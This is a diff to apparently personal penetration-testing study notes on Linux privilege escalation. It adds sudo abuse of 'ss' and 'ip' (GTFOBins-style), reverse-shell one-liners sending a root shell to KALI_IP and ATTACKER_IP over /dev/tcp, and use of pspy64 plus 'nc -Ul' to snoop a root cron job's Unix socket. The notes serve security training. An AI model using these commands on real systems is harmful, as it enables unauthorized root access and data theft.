@@ -682,6 +682,8 @@ crontab -l
 sudo crontab -l
 ```
 
+- note: no permission for cronjob -> use pspy64
+
 Check cron logs
 ```bash
 # Debian/Ubuntu commonly log cron activity in syslog
@@ -1026,7 +1028,6 @@ if effective UID = 0 -> process has root-level effective permissions even if lau
 ### Linux Capabilities
 
 
-
 Capabilities
 - extra attributes assigned to processes, binaries, services  
 - used to assign specific privileges usually reserved for admin operations (e.g. traffic capturing / adding kernel modules)  
@@ -1100,7 +1101,60 @@ sudo setcap cap_setuid+ep gdb
 GNU gdb (Debian 8.2.1-2+b3) 8.2.1
 # id
 uid=0(root) gid=1000(alice) groups=1000(alice)
+```
 
+https://gtfobins.github.io/gtfobins/ss/
+enumeration shows sudo privilege vulnerability
+```bash
+$ sudo -l
+User research may run the following commands on hostname:
+    (root) NOPASSWD: /bin/ss
+```
+
+If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+File read with `ss`
+```bash
+LFILE=file_to_read
+sudo ss -a -F $LFILE
+```
+
+```bash
+sudo PAGER="bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'" ss --help
+```
+Reasons it may fail:
+- `ss` does not necessarily invoke a pager in this context
+- `sudo` may reset or sanitize environment variables
+- `secure_path` is enabled in the sudo defaults
+- the GTFOBins technique for `ss` is file read, not shell execution
+- `PAGER` abuse works better with programs that actually invoke a pager, such as `less`, `man`, or similar tools
+
+run cmd with privileges of ip process - executes as root
+- Requires `CAP_NET_ADMIN` privileges
+
+```bash
+$ sudo -l
+User research may run the following commands on hostname:
+    (root) NOPASSWD: /bin/ip
+```
+
+```bash
+# 1) create a temporary namespace
+sudo /bin/ip netns add r00t
+
+# 2) exec a shell inside it (inherits root from sudo ip)
+sudo /bin/ip netns exec r00t /bin/bash -p
+# or, if bash isn't there: 
+sudo /bin/ip netns exec r00t /bin/sh
+```
+
+```bash
+# On your box:
+nc -lvnp 4444
+
+# On target:
+sudo /bin/ip netns add r00t
+sudo /bin/ip netns exec r00t bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
 ```
 
 
@@ -1427,6 +1481,28 @@ cp /home/username/oscp/exploits/privesc/linux/pspy64 .
 chmod +x pspy64  
 ./pspy64
 ```
+
+e.g. no permission for cronjob -> use pspy64
+```bash
+./pspy64
+...
+DATE CMD: UID=0     PID=PID_NUM   | /bin/bash /root/.scripts/tmp_s.sh 
+DATE CMD: UID=0     PID=PID_NUM   | /bin/sh -c /root/.scripts/tmp_s.sh 
+DATE CMD: UID=0     PID=PID_NUM   | /usr/sbin/CRON -f 
+...
+DATE CMD: UID=0     PID=PID_NUM   | socat - UNIX-CONNECT:/tmp/s 
+...
+```
+
+```bash
+nc -Ul /tmp/s             
+password_found
+```
+
+-> unix domain socket 
+- process bind/listen on the server side -> creates `/tmp/s` = filesystem socket node 
+-> using nc -> capture whatever root sends over that connection
+
 
 #### linenum
 
